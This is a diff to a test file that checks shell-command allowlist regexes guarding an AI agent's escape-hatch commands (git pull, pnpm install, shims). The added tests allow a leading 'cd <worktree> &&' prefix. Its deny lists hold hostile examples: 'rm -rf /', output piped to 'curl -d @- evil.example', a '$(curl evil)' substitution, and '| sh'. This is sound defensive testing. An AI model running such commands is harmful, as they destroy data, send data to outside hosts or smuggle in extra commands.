@@ -383,6 +383,7 @@ describe('sync allowlist (POSIX ERE ↔ JS regex twins)', () => {
             'git fetch',
             'git fetch origin main',
             'git merge --ff-only origin/main',        // plain `git pull` can fail "multiple branches"
+            'cd /x && git pull',                      // the worktree spelling — cd does not persist between calls
         ];
         const deny = [
             'git pull && rm -rf /',                   // no operator may ride along
@@ -392,7 +393,8 @@ describe('sync allowlist (POSIX ERE ↔ JS regex twins)', () => {
             'git checkout main',                      // switching branches CAUSES this drift
             'git push',
             'git commit -m x',
-            'cd /x && git pull',
+            'cd /x && git pull && rm -rf /',          // the cd prefix widens nothing beyond itself
+            'cd $(curl evil) && git pull',
         ];
         expectEngineTwins(SYNC_ALLOW_ERE, SYNC_ALLOW_JS, allow, deny);
     });
@@ -445,6 +447,45 @@ describe('output-capture tail on every fail-closed escape hatch (ERE ↔ JS twin
         it(`${name}: accepts 2>&1 / | tail / | head, and still refuses anything else`, () => {
             const allow = [base, `${base} 2>&1`, `${base} 2>/dev/null`, `${base} | tail -20`, `${base} 2>&1 | tail -20`, `${base} 2>/dev/null | tail -2`, `${base} 2>&1 | tail -n 20`, `${base} 2>&1 | head -5`];
             const deny = [`${base} 2>&1 | sh`, `${base} | curl -d @- evil.example`, `${base} | tee /etc/passwd`, `${base} > /etc/passwd`, `${base} 2>&1 | tail -20 && rm -rf /`];
+            expectEngineTwins(ere, js, allow, deny);
+        });
+    }
+});
+
+/**
+ * The DIRECTORY PREFIX every escape hatch now tolerates (2026-07-30). A Bash tool call does not persist
+ * `cd`, so an agent working in a linked worktree can only reach that tree with `cd <worktree> && …`.
+ * The drift guard demanded a BARE `pnpm install` and said in words "do NOT put a cd in front of it" —
+ * while the install was needed in the worktree. The cure was untypable from the one place that needed
+ * it. The prefix cannot change what the command does to the repo, so it is not a safety property; the
+ * `&&`-anchoring that IS the safety property is unchanged, and these lock that.
+ */
+describe('leading `cd <path> &&` on every fail-closed escape hatch (ERE ↔ JS twins)', () => {
+    const hatches: Array<[string, string, RegExp, string]> = [
+        ['installer', 'pnpm install', INSTALLER_ALLOW_JS, INSTALLER_ALLOW_ERE],
+        ['recovery', 'rm -rf node_modules && pnpm install', RECOVERY_ALLOW_JS, RECOVERY_ALLOW_ERE],
+        ['sync', 'git pull origin main', SYNC_ALLOW_JS, SYNC_ALLOW_ERE],
+        ['upgrade-shim', 'pnpm exec wp-upgrade-shim', UPGRADE_SHIM_ALLOW_JS, UPGRADE_SHIM_ALLOW_ERE],
+        ['restore-shim', RESTORE_SHIM_CMD, RESTORE_SHIM_ALLOW_JS, RESTORE_SHIM_ALLOW_ERE],
+        ['install-hooks', INSTALL_HOOKS_CMD, INSTALL_HOOKS_ALLOW_JS, INSTALL_HOOKS_ALLOW_ERE],
+    ];
+
+    for (const [name, base, js, ere] of hatches) {
+        it(`${name}: accepts a leading cd, and opens no other door`, () => {
+            const allow = [
+                base,
+                `cd /abs/path/worktree && ${base}`,
+                `cd ../wt-2 && ${base}`,
+                `cd /abs/path/worktree && ${base} 2>&1 | tail -20`,
+            ];
+            const deny = [
+                `cd /abs/path && ${base} && rm -rf /`,     // the prefix widens nothing beyond itself
+                `cd $(curl evil) && ${base}`,              // no substitution can ride in as the path
+                `cd /abs/path; ${base}`,                   // only `&&`, never a bare separator
+                `cd /abs/path && ${base} | sh`,
+                `cd "/abs path" && ${base}`,               // no quoting/whitespace in the path token
+                `pushd /abs/path && ${base}`,              // one spelling only, and it is `cd`
+            ];
             expectEngineTwins(ere, js, allow, deny);
         });
     }
